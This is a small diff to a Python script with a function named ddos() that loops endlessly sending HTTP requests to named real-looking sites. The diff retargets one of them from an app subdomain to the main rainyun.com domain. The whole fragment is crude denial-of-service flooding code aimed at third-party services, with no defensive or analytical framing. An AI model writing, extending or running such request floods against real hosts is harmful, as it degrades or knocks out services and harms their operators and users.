@@ -5,7 +5,7 @@ def ddos():
     while True:
         print('start ddos')
         requests.get('https://account.flweb.cn')
-        requests.get('https://app.rainyun.com')
+        requests.get('https://rainyun.com')
         print('end ddos')
 
 while True:
